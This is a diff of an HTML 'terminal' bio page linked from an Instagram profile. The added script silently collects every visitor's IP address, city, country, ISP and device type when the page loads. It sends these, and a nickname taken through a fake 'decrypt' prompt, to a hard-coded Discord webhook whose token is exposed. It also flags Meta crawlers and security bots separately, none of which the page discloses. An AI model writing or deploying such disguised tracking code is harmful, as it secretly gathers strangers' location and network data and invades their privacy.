@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Terminal Session</title>
     <style>
         html, body { 
@@ -20,8 +20,8 @@
             line-height: 1.5; 
             overflow-x: hidden;
         }
-        .line { margin-bottom: 6px; white-space: pre-wrap; word-break: break-word; display: flex; flex-wrap: wrap; align-items: center; }
-        .input-container { display: inline-flex; align-items: center; gap: 8px; margin-top: 4px; width: 100%; }
+        .line { margin-bottom: 6px; white-space: pre-wrap; word-break: break-all; }
+        .input-container { display: inline-flex; align-items: center; gap: 10px; width: 100%; margin-top: 5px; }
         input { 
             background: transparent; 
             border: none; 
@@ -30,7 +30,7 @@
             font-size: inherit; 
             outline: none; 
             flex-grow: 1;
-            max-width: 150px;
+            max-width: 180px;
             caret-color: #00ff33; 
             padding: 2px 0;
             margin: 0;
@@ -51,77 +51,105 @@
         }
         .term-btn:active { background-color: #ffffff; color: #050505; }
         .header-box { color: #ffffff; font-weight: bold; }
-        .tap-hint { color: #888888; font-style: italic; font-size: 12px; margin-top: 15px; }
+        .tap-hint { color: #888888; font-style: italic; font-size: 12px; }
         .timeout-text { color: #ff3333; font-weight: bold; }
     </style>
 </head>
 <body>
-
 <div id="terminal"></div>
 
 <script>
 // --- CONFIGURATION ---
-// Paste your Discord Webhook URL between the quotes below
-const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1542059603406356540/CCMUEg9CrtIVAa9b-fqm7nNtDkgP9bvOQSfy3l_A5qXaqAx2yGAh5xn1PqNluHpk8Th0";
+// ⚠️ PASTE YOUR DISCORD WEBHOOK URL INSIDE THE QUOTES BELOW
+const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1542059603406356540/CCMUEg9CrtIVAa9b-fqm7nNtDkgP9bvOQSfy3l_A5qXaqAx2yGAh5xn1PqNluHpk8Th0"; 
 const TIMEOUT_DURATION = 5 * 60 * 1000; 
-
 const terminal = document.getElementById('terminal');
 let idleTimer;
 let inputElement;
 let submitBtnElement;
+let totalVisits = "Fetching...";
+let geoDataString = "Fetching location details...";
 
-// ALERT DISCORD THE INSTANT THE PAGE LOADS
-function alertPageLoad() {
-    if (DISCORD_WEBHOOK_URL !== "YOUR_DISCORD_WEBHOOK_URL_HERE") {
-        fetch(DISCORD_WEBHOOK_URL, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ content: `👀 **Traffic Alert:** Someone just clicked your Instagram bio link! (Waiting for name...)` })
-        }).catch(err => console.error("Load logging failed:", err));
-    }
+// --- SMART DEVICE & BOT DETECTOR ---
+const userAgent = navigator.userAgent.toLowerCase();
+let deviceType = "📱 Mobile Device (Unknown Browser)";
+
+if (userAgent.includes("facebookexternalhit") || userAgent.includes("meta-external") || userAgent.includes("bot") || userAgent.includes("spider") || userAgent.includes("crawl")) {
+    deviceType = "🚨 META CRAWLER / SECURITY BOT";
+} else if (userAgent.includes("instagram")) {
+    deviceType = "📸 Instagram In-App Browser";
+} else if (userAgent.includes("iphone") || userAgent.includes("ipad") || userAgent.includes("ipod")) {
+    deviceType = "🍏 iPhone / iOS Device";
+} else if (userAgent.includes("android")) {
+    deviceType = "🤖 Android Device";
+} else if (userAgent.includes("windows") || userAgent.includes("macintosh") || userAgent.includes("linux")) {
+    deviceType = "💻 Desktop PC / Laptop";
+}
+
+function fetchHitCounter() {
+    fetch("https://counterapi.dev")
+    .then(response => response.json())
+    .then(data => {
+        if(data && data.count) { totalVisits = data.count; }
+    })
+    .catch(err => { totalVisits = "Dynamic Data Offline"; });
+}
+
+// --- NEW GEO-LOCATION TRACKER ---
+function fetchLocationAndLog() {
+    fetch("https://ipapi.co")
+    .then(res => res.json())
+    .then(data => {
+        if (data && !data.error) {
+            geoDataString = `📍 **Location:** ${data.city}, ${data.region}, ${data.country_name}\n🌐 **IP Address:** ${data.ip}\n🏢 **ISP Network:** ${data.org}`;
+        } else {
+            geoDataString = "❌ Location blocked or unavailable.";
+        }
+        // Send initial traffic alert with full device + city info right away
+        sendDiscordAlert("⚠️ Traffic Alert: Link Opened", "Visitor landed on terminal skin.");
+    })
+    .catch(err => {
+        geoDataString = "⚠️ Location services timeout.";
+        sendDiscordAlert("⚠️ Traffic Alert: Link Opened", "Visitor landed on terminal skin.");
+    });
 }
 
 function initTerminal(isTimeout = false) {
     terminal.innerHTML = ''; 
     if (isTimeout) {
         appendLine("[SYSTEM WARNING] Idle session terminated.", "timeout-text");
-        appendLine("[CRITICAL] Connection closed due to inactivity.\n", "timeout-text");
+        appendLine("[CRITICAL] Connection closed due to inactivity.\n");
     }
-    appendLine("Establishing secure connection...");
-    appendLine("Connection successful. Welcome to my space.");
+    
+    appendLine("⚙️ Initializing Secure Sandbox Connection...");
+    appendLine("✅ Decryption Handshake: SUCCESSFUL.");
+    appendLine("--------------------------------------------------");
+    appendLine("🔒 ACCESS RESTRICTED: PRIVATE SERVER PORTAL");
+    appendLine("💡 TIP: You don't have to use your real identity.");
     appendLine("--------------------------------------------------");
     
     const promptLine = document.createElement('div');
     promptLine.className = 'line';
     promptLine.id = 'prompt-line';
     promptLine.innerHTML = `
-        <span>Enter Your Name to Continue:</span>
+        <span>Enter any Nickname to decrypt profile:</span>
         <div class="input-container">
-            <input type="text" id="username" autocomplete="off" placeholder="...">
-            <button id="submit-btn" class="term-btn">[SUBMIT]</button>
+            <input type="text" id="username" autocomplete="off" placeholder="guest_user">
+            <button id="submit-btn" class="term-btn">[DECRYPT]</button>
         </div>
     `;
     terminal.appendChild(promptLine);
-    appendLine("(📲 Tap anywhere on the screen to type)", "tap-hint");
+    appendLine("(📲 Tap anywhere to open keyboard)", "tap-hint");
     
     inputElement = document.getElementById('username');
     submitBtnElement = document.getElementById('submit-btn');
     
-    inputElement.addEventListener('keydown', function(e) {
-        if (e.key === 'Enter') processSelection();
-    });
-    submitBtnElement.addEventListener('click', function(e) {
-        e.stopPropagation();
-        processSelection();
-    });
+    inputElement.addEventListener('keydown', function(e) { if (e.key === 'Enter') processSelection(); });
+    submitBtnElement.addEventListener('click', function(e) { e.stopPropagation(); processSelection(); });
 }
 
-document.addEventListener('click', function(e) {
-    if (inputElement && e.target !== submitBtnElement) inputElement.focus();
-});
-document.addEventListener('touchstart', function(e) {
-    if (inputElement && e.target !== submitBtnElement) inputElement.focus();
-});
+document.addEventListener('click', function(e) { if (inputElement && e.target !== submitBtnElement) inputElement.focus(); });
+document.addEventListener('touchstart', function(e) { if (inputElement && e.target !== submitBtnElement) inputElement.focus(); });
 
 function appendLine(text, customClass = "") {
     const div = document.createElement('div');
@@ -133,75 +161,85 @@ function appendLine(text, customClass = "") {
 
 function startIdleTimer() {
     clearTimeout(idleTimer);
-    idleTimer = setTimeout(() => {
-        initTerminal(true);
-    }, TIMEOUT_DURATION);
+    idleTimer = setTimeout(() => { initTerminal(true); }, TIMEOUT_DURATION);
 }
 
 ['click', 'touchstart', 'scroll', 'keydown'].forEach(evt => {
-    document.addEventListener(evt, () => {
-        if (!document.getElementById('username')) {
-            startIdleTimer();
-        }
-    });
+    document.addEventListener(evt, () => { if (!document.getElementById('username')) startIdleTimer(); });
 });
 
-function processSelection() {
-    const name = inputElement.value.trim() || "Guest_User";
-    const hint = document.querySelector('.tap-hint');
-    if(hint) hint.remove();
-    
-    document.getElementById('prompt-line').innerHTML = `Enter Your Name to Continue: <strong>${name}</strong>`;
-    
+function sendDiscordAlert(eventTitle, detailValue) {
     if (DISCORD_WEBHOOK_URL !== "YOUR_DISCORD_WEBHOOK_URL_HERE") {
+        const isBot = deviceType.includes("CRAWLER");
+        const payload = {
+            embeds: [{
+                title: eventTitle,
+                color: isBot ? 16711680 : 65280, 
+                fields: [
+                    { name: "Current Status", value: detailValue, inline: false },
+                    { name: "Device Info / Platform", value: deviceType, inline: false },
+                    { name: "Network Telemetry Data", value: geoDataString, inline: false },
+                    { name: "Time Logged", value: new Date().toLocaleString(), inline: true }
+                ]
+            }]
+        };
         fetch(DISCORD_WEBHOOK_URL, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ content: `🔔 **Authentication Success:** User verified as \`${name}\`!` })
-        }).catch(err => console.error("Logging failed:", err));
+            body: JSON.stringify(payload)
+        }).catch(err => console.error("Telemetry error:", err));
     }
+}
 
+function processSelection() {
+    const name = inputElement.value.trim() || "Anonymous_Guest";
+    const hint = document.querySelector('.tap-hint');
+    if(hint) hint.remove();
+    
+    document.getElementById('prompt-line').innerHTML = `Decryption Cipher Completed. Code: Verified.`;
+    
+    // Send final identity alert when button is pressed
+    sendDiscordAlert("👤 Verification Completed", `User logged in as username: **${name}**`);
+    
     setTimeout(() => { showBio(name); }, 600);
 }
 
 function showBio(visitorName) {
     const bioLines = [
         `\n[SYSTEM] Access granted. Hello, ${visitorName}!`,
-        "[SYSTEM] Loading profile details...",
+        "[SYSTEM] Loading profile details into system mainframe...",
         "==================================================",
-        "  W E L C O M E   T O   M Y   B I O",
+        "          W E L C O M E  T O  M Y  B I O",
         "==================================================",
-        "  👉 USER: SAJID",
+        " 👉 USERNAME: SAJID",
         "==================================================",
-        "ABOUT ME:   Just a guy navigating through new things.",
-        "LIKES:      Video games and Marvel comics.",
-        "CURRENTLY:  Exploring new tech and building cool spaces.",
+        "ABOUT ME: Just a guy navigating through new things.",
+        "LIKES: Video games and Marvel comics.",
+        "CURRENTLY: Exploring new tech and building cool spaces.",
         "--------------------------------------------------",
-        "STATUS:     Catch me on Instagram DMs if you want to chat.",
+        "TRAFFIC: " + totalVisits + " total packets processed.",
+        "STATUS: Catch me on Instagram DMs if you want to chat.",
         "\nsession_closed_bye@instagram_bio:~$"
     ];
-
     let delay = 0;
     bioLines.forEach(text => {
         setTimeout(() => {
             const div = document.createElement('div');
             div.className = 'line';
-            if (text.includes("W E L C O M E") || text.includes("USER: SAJID")) {
-                div.className = 'line header-box';
-            }
+            if (text.includes("W E L C O M E") || text.includes("USERNAME:")) { div.className = 'line header-box'; }
             div.textContent = text;
             terminal.appendChild(div);
             window.scrollTo(0, document.body.scrollHeight);
         }, delay);
         delay += 250;
     });
-    
     startIdleTimer();
 }
 
 window.onload = () => { 
-    alertPageLoad(); // Fire instant alert to Discord on page load
+    fetchHitCounter(); 
     initTerminal(false); 
+    fetchLocationAndLog(); // Triggers the tracking pipeline
 };
 </script>
 </body>
